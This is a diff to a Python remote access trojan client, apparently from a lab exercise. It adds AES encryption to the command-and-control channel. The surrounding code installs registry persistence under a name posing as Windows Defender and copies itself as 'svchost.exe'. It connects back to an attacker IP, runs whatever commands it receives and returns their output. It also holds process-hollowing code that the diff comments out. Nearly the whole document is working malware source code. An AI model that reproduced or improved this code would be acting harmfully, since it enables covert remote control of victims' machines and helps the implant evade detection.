@@ -1,6 +1,4 @@
 # rat_client.py (on Victim VM)
-from ctypes import cdll
-import getpass
 import socket
 import subprocess
 import os
@@ -11,32 +9,113 @@ import getpass
 import struct
 from ctypes import *
 from ctypes.wintypes import *
-
-
-import winreg  
+import winreg
 import shutil
-ATTACKER_IP = "192.168.56.102"
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+import base64
+import os as crypto_os
+
+ATTACKER_IP = "192.168.56.102" # IP of the attacker's machine
 ATTACKER_PORT = 9999
 BUFFER_SIZE = 4096
-RECONNECT_DELAY = 5 
+RECONNECT_DELAY = 5
 SIMULATE_DELAY = True
-SIMULATE_STARTUP_DELAY = random.uniform(1, 5) 
-
+SIMULATE_STARTUP_DELAY = random.uniform(1, 5)
 ntdll = windll.ntdll
 kernel32 = windll.kernel32
-
-# Définitions
-PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
-EXTENDED_STARTUPINFO_PRESENT = 0x00080000
-
-
 PERSISTENCE_KEY_NAME = "WindowsDefenderUpdater" 
 COPY_TO_TEMP = True 
 TEMP_FILENAME = "svchost.exe" 
-def debug_print(message):
 
+PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
+EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+
+SHARED_PASSWORD = b"MyS3cr3tP@ssw0rd!2024" 
+SALT = b"ratsalt12345678" 
+def debug_print(message):
     print(f"[RAT] {message}")
 
+backend = default_backend()
+
+def derive_key(password: bytes, salt: bytes) -> bytes:
+    """Derives a 32-byte AES key from a password and salt."""
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32, # AES-256 key size
+        salt=salt,
+        iterations=100000,
+        backend=backend
+    )
+    key = kdf.derive(password)
+    return key
+
+try:
+    AES_KEY = derive_key(SHARED_PASSWORD, SALT)
+    debug_print("Encryption key derived from password.")
+except Exception as e:
+    debug_print(f"Error deriving encryption key: {e}. Encryption disabled.")
+    AES_KEY = None 
+def encrypt_data(data: str) -> bytes:
+    """Encrypts data using AES-256-CBC and returns base64 encoded bytes."""
+    if not AES_KEY:
+        return data.encode('utf-8')
+    
+    try:
+        if isinstance(data, str):
+            data = data.encode('utf-8')
+            
+        iv = crypto_os.urandom(16)
+        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
+        encryptor = cipher.encryptor()
+        
+        pad_len = 16 - (len(data) % 16)
+        padded_data = data + bytes([pad_len] * pad_len)
+        
+        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
+        return base64.b64encode(iv + ciphertext)
+    except Exception as e:
+        debug_print(f"Encryption error: {e}")
+        return data if isinstance(data, bytes) else data.encode('utf-8')
+
+def decrypt_data(data: bytes) -> str:
+    """Decrypts base64 encoded data using AES-256-CBC."""
+    if not AES_KEY:
+        try:
+            return data.decode('utf-8')
+        except:
+            return str(data)
+    
+    try:
+        if isinstance(data, str):
+            data = data.encode('utf-8')
+            
+        encrypted_data = base64.b64decode(data)
+        if len(encrypted_data) < 16:
+            raise ValueError("Data too short for IV")
+            
+        iv = encrypted_data[:16]
+        ciphertext = encrypted_data[16:]
+        
+        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
+        decryptor = cipher.decryptor()
+        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
+        
+        pad_len = padded_plaintext[-1]
+        if pad_len > 16:
+            debug_print("Padding warning: invalid pad length, trying to strip last byte")
+            pad_len = 1
+            
+        plaintext = padded_plaintext[:-pad_len]
+        return plaintext.decode('utf-8')
+    except Exception as e:
+        debug_print(f"Decryption error: {e}")
+        try:
+            return data.decode('utf-8')
+        except:
+            return str(data)
 
 def add_to_registry():
     """Attempts to add the client script/exe path to the Windows Registry for persistence."""
@@ -53,10 +132,8 @@ def add_to_registry():
             else:
                 destination_path = os.path.join(temp_dir, TEMP_FILENAME)
                 try:
-                    # Copy the file
                     shutil.copy2(current_script_path, destination_path)
-                    # Optional: Make it hidden (requires pywin32 or similar for full hidden attribute)
-                    # For basic stealth, just copying to a non-suspicious name in TEMP helps
+                    
                     debug_print(f"Copied client to: {destination_path}")
                     final_path = destination_path
                 except Exception as e:
@@ -124,7 +201,7 @@ def execute_command(command):
     except Exception as e:
         return f"[Error executing command: {e}]"
 
-def shedule_task_for_user():
+"""def shedule_task_for_user():
     task_name = "UpdaterService"
     script_path = os.path.abspath("rat_client.py") 
     user = getpass.getuser()
@@ -254,9 +331,7 @@ def perform_hollowing(target_path, payload_path):
     if inject_and_resume(hProcess, hThread, payload):
         print("✅ Hollowing succeeded")
     else:
-        print("❌ Hollowing failed")
-    windll.kernel32.CloseHandle(hThread)
-    windll.kernel32.CloseHandle(hProcess)
+        print(f"❌ Hollowing échoué, code erreur {result}")"""
 
 
 def main():
@@ -270,14 +345,14 @@ def main():
              debug_print("Persistence setup completed.")
     else:
              debug_print("Persistence setup failed or skipped.")
-    shedule_task_for_user()
+    #shedule_task_for_user()
+    #hollowing()
     sock = None
     try:
         while True:
             if sock is None:
                 sock = connect_to_server()
 
-            # Receive command
             try:
                 data = sock.recv(BUFFER_SIZE)
                 if not data :
@@ -291,10 +366,10 @@ def main():
                 if not command:
                     continue
 
-                debug_print(f"Received command: {repr(command)}")
-                output = execute_command(command)
+                debug_print(f"Received command: {decrypt_data(repr(command))}")
+                output = execute_command(decrypt_data(command))
                 response = f"[Output from Victim VM]\n{output}\n[End of Output]\n"
-                sock.sendall(response.encode('utf-8', errors='ignore'))
+                sock.sendall(encrypt_data(response.encode('utf-8', errors='ignore')))
                 debug_print("Output sent back to server.")
 
             except socket.timeout:
